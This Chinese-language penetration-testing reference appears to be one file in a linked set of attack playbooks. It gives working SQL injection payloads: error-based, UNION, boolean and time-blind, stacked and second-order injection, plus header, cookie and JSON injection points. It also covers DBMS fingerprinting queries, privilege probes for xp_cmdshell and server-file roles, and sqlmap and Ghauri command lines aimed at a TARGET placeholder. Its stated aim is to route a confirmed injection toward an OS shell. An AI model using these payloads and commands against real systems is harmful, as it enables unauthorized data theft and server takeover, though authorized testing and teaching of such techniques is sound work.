# SQL Injection 详细参考 — 发现、确认与DBMS路由

> 本文件只处理 **HTTP/Web 输入触发的 SQL Injection 漏洞发现、确认、注入类型判断、DBMS 指纹和最小权限探针**。
>
> 扫描发现 1433/3306/5432/1521 后直接连接数据库服务属于 `/recon`/对应服务流程，不在这里展开。
>
> SQLi 已确认后，不在本文件继续展开 DBMS 后利用。根据后端路由到对应 `sqli-*-chain.md`，目标是把已确认 SQLi 推进到 Shell。

---

## 1. SQLi 快速确认

### 1.1 先确认参数是否影响查询

不要只看单次报错；先建立基线：

```text
原始请求      → status / length / body / response time
语法扰动      → 是否出现数据库错误或稳定差异
TRUE条件       → 是否回到正常逻辑
FALSE条件      → 是否出现可重复差异
```

常见探测：

```text
'
"
')
'))
'-- -
' OR '1'='1'-- -
' AND '1'='2'-- -
```

数字上下文：

```text
1 AND 1=1
1 AND 1=2
1 OR 1=1
```

**成功判断：** TRUE/FALSE、错误、响应长度、状态码或时间差必须可重复；单次 500 不等于 SQLi。

---

## 2. 注入类型判断

### 2.1 报错注入

有数据库错误回显时优先利用错误确认 DBMS 和表达式执行。

```sql
-- MySQL/MariaDB
AND extractvalue(1,concat(0x7e,(SELECT version())))
AND updatexml(1,concat(0x7e,(SELECT user())),1)

-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))-- //

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS NUMERIC)-- //
```

### 2.2 UNION 联合查询

```sql
-- 测列数
' ORDER BY 1-- //
' ORDER BY 2-- //

-- 确认回显位
' UNION SELECT null,null,null,null,null-- //

-- MySQL示例
' UNION SELECT null,database(),user(),@@version,null-- //
```

确认可回显列后再枚举 schema/data；不要在列数未确认前盲目堆 payload。

### 2.3 布尔盲注

```sql
' AND 1=1-- //
' AND 1=2-- //
```

确认 oracle 后再做字符级判断；稳定性优先于速度。

### 2.4 时间盲注

```sql
-- MySQL/MariaDB
' AND IF(1=1,SLEEP(3),0)-- //

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

时间型必须多次测基线，避免把后端波动当成 SQLi。

### 2.5 堆叠查询

先确认驱动/API允许多语句；不要因为 DBMS 本身支持就默认 Web 驱动允许 stacked query。

```sql
'; SELECT 1;--
'; UPDATE users SET last_login=last_login WHERE id=1;--
```

在授权/靶场环境确认 stacked 后，再进入对应 DBMS chain。

### 2.6 二次注入（Second-Order）

```text
第一次请求：输入被保存但不执行
第二个功能：把已保存值重新拼接到SQL
常见位置：用户名 / 邮箱 / 地址 / 备注 → 改密 / 导出 / 后台审核 / 日志查询
```

```bash
sqlmap -r request.txt --second-url='http://TARGET/profile' --batch
```

### 2.7 OOB 只作为确认/加速信号

OOB 需要 DBMS 特定能力，不要在 SQLi 尚未确认时直接把 OOB 失败当作无漏洞。

```text
MySQL on Windows → UNC/LOAD_FILE 条件
MSSQL            → xp_dirtree/xp_fileexist 对当前上下文可执行
PostgreSQL       → pg_execute_server_program/superuser 等高权限条件
```

详细 OOB/OS 链放在对应 DBMS chain。

---

## 3. 注入点扩展

SQLi 不只在 GET/POST 参数：

```text
Header: X-Forwarded-For / User-Agent / Referer / 自定义审计头
Cookie
JSON body
GraphQL variable
排序字段 sort/order
搜索/报表/filter参数
导出功能
后台审计日志
WebSocket消息
批量API数组元素
```

示例：

```http
X-Forwarded-For: 127.0.0.1' OR 1=1--
Cookie: tracking=abc' AND SLEEP(3)-- -
Content-Type: application/json

{"query":"shoes' OR 1=1--"}
```

参数进入 ORM filter expression 而不是 raw SQL 时 → **orm-leak.md**，不要强行用 `' OR 1=1` 测到死。

---

## 4. DBMS 指纹

### MySQL / MariaDB

```sql
SELECT VERSION();
SELECT @@version;
SELECT USER();
SELECT CURRENT_USER();
SELECT DATABASE();
SELECT @@hostname;
```

特征：`MySQL/MariaDB`、`information_schema`、反引号、`SLEEP()`。

### MSSQL

```sql
SELECT @@VERSION;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT DB_NAME();
SELECT HOST_NAME();
```

特征：`Microsoft SQL Server`、`WAITFOR DELAY`、`sys.*`。

### PostgreSQL

```sql
SELECT version();
SELECT current_user;
SELECT current_database();
SELECT inet_server_addr();
```

特征：`PostgreSQL`、`pg_sleep()`、`pg_catalog`、`::type`。

### Oracle

```sql
SELECT banner FROM v$version WHERE ROWNUM=1;
SELECT USER FROM dual;
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual;
SELECT SYS_CONTEXT('USERENV','SERVER_HOST') FROM dual;
```

特征：`ORA-xxxxx`、`FROM dual`、`DBMS_*`。

### SQLite

```sql
SELECT sqlite_version();
SELECT name FROM sqlite_master WHERE type='table';
PRAGMA table_info(users);
```

SQLite 通常是应用进程内数据库。SQLi 多数先产生数据读写/业务影响；除非发现可加载扩展、危险 UDF、可组合文件写入等明确 primitive，不要默认存在标准“DB 服务→OS Shell”路径。

---

## 5. 最小权限探针 — 只为路由，不在这里利用

SQLi 确认后，做足以决定下一文件的最小探针即可。

### MySQL / MariaDB

```sql
SELECT CURRENT_USER(),@@version,@@hostname,@@secure_file_priv;
SHOW GRANTS;
```

关注：

```text
FILE privilege
secure_file_priv
高权限全局变量控制（SUPER / SYSTEM_VARIABLES_ADMIN等）
目标是否Windows
```

→ **sqli-mysql-chain.md**

### MSSQL

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions(NULL,'SERVER');
```

关注：

```text
sysadmin
IMPERSONATE
xp_cmdshell / OLE / CLR
UNC/NTLM primitive
```

→ **sqli-mssql-chain.md**

### PostgreSQL

```sql
SELECT current_user;
SELECT rolsuper FROM pg_roles WHERE rolname=current_user;
SELECT pg_has_role(current_user,'pg_read_server_files','MEMBER');
SELECT pg_has_role(current_user,'pg_write_server_files','MEMBER');
SELECT pg_has_role(current_user,'pg_execute_server_program','MEMBER');
```

→ **sqli-postgresql-chain.md**

### Oracle

```sql
SELECT USER FROM dual;
SELECT * FROM SESSION_PRIVS;
SELECT * FROM SESSION_ROLES;
```

关注：

```text
CREATE JOB
CREATE EXTERNAL JOB
CREATE PROCEDURE / Java相关权限
文件/网络包权限
```

→ **sqli-oracle-chain.md**

---

## 6. ORM Raw SQL ≠ ORM Leak

以下仍属于传统 SQLi sink：

```text
Django      Model.objects.raw(...)
            Model.objects.extra(...)
SQLAlchemy  text(...) / execute(raw string)
ActiveRecord manual interpolation
Sequelize   sequelize.query(...) / literal(...)
Hibernate   拼接 HQL/SQL 字符串
```

如果用户输入控制的是 ORM 查询操作符/关系字段，而不是 raw SQL 字符串：

```text
field__startswith
relation__secret__contains
Prisma filter object
OData $filter
```

→ **orm-leak.md**。

---

## 7. 自动化验证

### sqlmap

```bash
# 基础确认
sqlmap -u 'http://TARGET/page?id=1' -p id --batch

# Burp请求
sqlmap -r request.txt -p param --batch

# JSON/API
sqlmap -r request.txt -p id --batch

# 已有可靠指纹时指定DBMS
sqlmap -r request.txt -p id --dbms=PostgreSQL --batch

# 当前数据库身份/权限（用于路由）
sqlmap -r request.txt -p id --current-user --current-db --privileges --batch
```

不要在“发现 SQLi”阶段默认直接 `--os-shell`。先确认 DBMS 和权限，再进入对应 `sqli-*-chain.md`，这样能知道为什么某条 OS 链成功或失败。

### Ghauri

```bash
ghauri -u 'http://TARGET/page?id=1' --dbs
```

复杂请求按当前版本 `--help` 使用 raw request/cookie/header 选项。

---

## 8. SQLi 路由决策树

```text
HTTP/Web参数
    ↓
SQLi candidate
    ↓
TRUE/FALSE / Error / UNION / Time / OOB 之一稳定确认？
├─ NO  → 返回其他Web漏洞类型
└─ YES
    ↓
DBMS fingerprint
    │
    ├─ MSSQL       → sqli-mssql-chain.md
    ├─ MySQL       → sqli-mysql-chain.md
    ├─ PostgreSQL  → sqli-postgresql-chain.md
    ├─ Oracle      → sqli-oracle-chain.md
    └─ SQLite/其他 → 继续数据/业务影响；只有发现明确OS primitive才继续Shell链
```

**本文件在“SQLi confirmed + DBMS routed”处结束。** 后续 DBMS 利用链由对应 reference 负责，直到 Shell obtained。
